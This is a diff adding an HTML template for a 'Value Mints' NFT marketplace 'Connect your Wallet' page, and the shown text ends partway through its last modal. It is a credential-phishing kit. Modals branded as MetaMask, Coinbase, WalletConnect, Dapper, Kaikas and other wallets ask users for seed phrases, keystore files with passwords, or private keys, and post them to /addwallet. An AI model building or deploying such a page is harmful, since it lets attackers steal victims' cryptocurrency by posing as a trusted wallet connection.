@@ -1,0 +1,2589 @@
+<!DOCTYPE html><html class="no-js" lang="en"><head>
+<meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Value Mints - Mobile NFT Marketplace">
+    <meta name="author" content="Themeland">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="theme-color" content="#09080D">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <!-- The above tags *must* come first in the head; any other head content must come *after* these tags -->
+
+    <!-- Title  -->
+    <title>Value Mints - Mobile NFT Marketplace</title>
+
+    <!-- Favicon-->
+    <link rel="icon" href="../public/assets/img/icons/icon-72x72.png">
+
+    <!-- Apple Touch Icon-->
+    <link rel="apple-touch-icon" href="../public/assets/img/icons/icon-96x96.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="../public/assets/img/icons/icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="167x167" href="../public/assets/img/icons/icon-167x167.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="../public/assets/img/icons/icon-180x180.png">
+
+    <!-- ***** All CSS Files ***** --> 
+
+    <link rel="stylesheet" href="{{ url_for('static', path='public/assets/porto/vendor/bootstrap/css/bootstrap.css') }}">
+
+    
+    <link rel="stylesheet" href="{{ url_for('static', path='cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css') }}">
+
+
+    <!-- Style CSS -->
+    <link rel="stylesheet" href="{{ url_for('static', path='public/assets/frontend/css/style.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', path='public/assets/frontend/css/tab.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', path='public/assets/frontend/css/miniinvestdash.css') }}">
+    
+
+
+
+
+    <!-- Web App Manifest-->
+    <link rel="manifest" href="https://demo8.codesremedy.com.ng/public/assets/frontend/manifest.json">
+    
+</head>
+
+<body>
+
+
+<div class="main">
+    <div id="header" class="header-area">
+            <div class="container d-flex justify-content-between align-items-center h-100">
+                <!-- Logo Wrapper -->
+                <div class="logo-wrapper">
+                    <a href="https://demo8.codesremedy.com.ng/home">
+                        
+                        <img src="{{ url_for('static', path='public/assets/img/logo/logo.png') }}" alt="">
+                    </a>
+                </div>
+                <!-- Search Form -->
+                <div class="search-form">
+                    <form action="#" method="">
+                        <input class="form-control" type="search" placeholder="Enter your keyword">
+                        <button type="submit">
+                            <i class="fas fa-search"></i>
+                        </button>
+                    </form>
+                </div>
+                <!-- Navbar Toggler-->
+                <div class="navbar-toggler" data-bs-toggle="offcanvas" data-bs-target="#netseaOffcanvas" aria-controls="netseaOffcanvas">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+        
+                <!--====== Preloader Area End ======-->
+        <div class="offcanvas offcanvas-start netsea-offcanvas-wrap" tabindex="-1" id="netseaOffcanvas" aria-labelledby="netseaOffcanvasLabel">
+            <!-- Close Button -->
+            <button class="btn-close btn-close-white text-reset" type="button" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+            <!-- Offcanvas Body -->
+            <div class="offcanvas-body">
+                <!-- Sidenav Profile -->
+                <div class="sidenav-profile text-center pt-5 px-3">
+                    <!-- Profile Thumb -->
+                    <div class="profile-thumb d-inline-block"> 
+                        <img class="avatar-lg rounded-circle" src="../public/assets/uploads/photos/default.jpg" alt="">
+                    </div>
+                    <!-- Profile Info -->
+                    <div class="profile-info">
+                        <h5 class="mb-1">Login/Register</h5>
+                    </div>
+                </div>
+                <!-- Sidenav Nav -->
+                <ul class="sidenav-nav ps-0">
+                    <!--<li><a href="https://demo8.codesremedy.com.ng/wallet-connect"><i class="icon-wallet"></i>Wallet Connect</a></li>-->
+                    
+                    <!--<li><a href="https://demo8.codesremedy.com.ng/nft-trade"><i class="icon-support"></i>NFT Trade</a></li>-->
+                    
+
+                    <li><a href="https://demo8.codesremedy.com.ng/explore"><i class="icon-grid"></i>Explore</a>
+                    </li>
+                    <li><a href="https://demo8.codesremedy.com.ng/terms"><i class="icon-support"></i>Terms of Service</a></li>
+                    <!--<li><a href="https://demo8.codesremedy.com.ng/authors"><i class="icon-support"></i>Collections</a></li>-->
+                    <li><a href="https://demo8.codesremedy.com.ng/login"><i class="icon-login"></i>Login</a></li>
+                    <li><a href="https://demo8.codesremedy.com.ng/register"><i class="icon-user"></i>Signup</a></li>
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- ***** Header End ***** -->
+</div>
+
+        
+        
+    
+
+
+
+
+
+
+        <!-- ***** Header End ***** -->
+        
+        <!-- ***** Page Wrapper Start ***** -->
+        <div class="page-wrapper">
+
+            <!-- ***** Wallet Connect Area Start ***** -->
+            <section class="wallet-connect-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-8 col-lg-7">
+                            <!-- Intro -->
+                            <div class="intro text-center">
+                                <span>Wallet Connect</span>
+                                <h3 class="mt-2 mb-0">Connect your Wallet</h3>
+                                <p>Connect a preferred to Value Mints.</p>
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <style>
+                        .modal-maxwithd {
+                          max-width: unset !important;
+                      }
+                      </style>
+                              <!-- ***** Page Wrapper Start ***** -->
+                              <div class="modal fade" id="exampleModal" aria-hidden="true">                      
+                                  <div class="modal-dialog modal-maxwithd">
+                                    <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/metamask.png') }}" alt="">
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="metamask">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                                    </div>
+                            </div>
+
+                            <div class="modal fade" id="authereumModal" aria-hidden="true">                      
+                                <div class="modal-dialog modal-maxwithd">
+                                  <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/authereum.png') }}" alt="">
+
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="authereum">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                                  </div>
+                          </div>
+                          
+                          <div class="modal fade" id="walletconnectModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/walletconnect.png') }}" alt="">
+
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>   
+
+                        <div class="modal fade" id="dapperModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/dapper.png') }}" alt="">
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="dapper">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>   
+
+                        <div class="modal fade" id="kaikasModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/kaikas.png') }}" alt="">
+
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="kaikas">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div>
+                        
+                        <div class="modal fade" id="bitskyModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/content/metamask.png') }}" alt="">
+                                    
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="privatekey" placeholder="Private Key">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">a string of letters and numbers</label>
+                                        </div>
+                                    </div>
+                                </div>                                
+                            </div>   
+                            <input type="hidden" id="custId" name="method" value="bitsky">
+                            
+                            <div class="row">
+                                <div class="col-12">
+                                    <button class="btn btn-bordered w-100" type="submit">Import</button>
+                                </div>
+                            </div>
+
+                            </form>
+                        </div>
+                    </div>
+                </div>
+
+            </section>
+        </div>
+
+            <!-- ***** Create Area End ***** -->
+   
+        <!-- ***** Page Wrapper End ***** -->
+
+
+
+                              </div>
+                        </div> 
+                        
+                        <div class="modal fade" id="coinbaseModal" aria-hidden="true">                      
+                            <div class="modal-dialog modal-maxwithd">
+                              <!-- Button trigger modal -->
+
+          
+
+            <!-- ***** Create Area Start ***** -->
+            
+            <div class="modal-content" style="background-color: #0000004f">
+
+            <section class="author-area">
+                <div class="container">
+                    <div class="row justify-content-center">
+                        <div class="col-12 col-md-7">
+                            <!-- Intro -->
+
+                            <style>
+                                .imageconnect {
+                                  text-align: center;
+                                  padding-bottom: 25px;                                  
+                                }
+
+                                .closemodal {
+                                    float: right;                                                                 
+                                }
+                              </style>                            
+
+                            
+
+                                <button type="button" class="btn-close btn-close-white closemodal" data-bs-dismiss="modal" aria-label="Close"></button>
+
+                            <div class="imageconnect">
+                                    <img class="avatar-md" src="{{ url_for('static', path='public/assets/img/wallets/coinbase.png') }}" alt="">
+                                    
+                                </div>                             
+                               
+
+                            <!-- Item Form -->
+                            <form method="POST" enctype="multipart/form-data" action="/addwallet" class="item-form card no-hover">
+                                <input type="hidden" name="_token" value="cANy9EiTLyV3BkVK02txC89zess3GrkeRcV62t7o">  
+                                <div class="row mb-2">
+                                    <div class="tabs__head">
+                                        <div class="tabs__toggle is-active">
+                                            <span class="tabs__name">Phrase</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Keystore JSON</span>
+                                        </div>
+                                        <div class="tabs__toggle">
+                                            <span class="tabs__name">Private Key</span>
+                                        </div>
+                                    </div>
+                                </div> 
+
+                                <div class="tabs__content is-active">                                  
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="phrase" placeholder="Enter Phrase..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Typically 12 (sometimes 24) words separated by single spaces
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <textarea style="height:150px !important;" class="form-control" name="keystore" placeholder="Keystore JSON..." cols="200" rows="3"></textarea>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <input type="text" class="form-control" name="password" placeholder="Password">
+                                        </div>
+                                    </div>
+                                </div>                                
+                                <div class="row mb-2">
+                                    <div class="col-12">
+                                        <div class="form-group">
+                                            <label class="imageconnect" for="inlineRadio2">Several lines of text beginning with '(...)' plus the password you used to encrypt it.
+                                            </label>
+                                        </div>
+                                    </div>
+                                </div>                                
+
+                            </div>
+                            
+                            <div class="tabs__content">
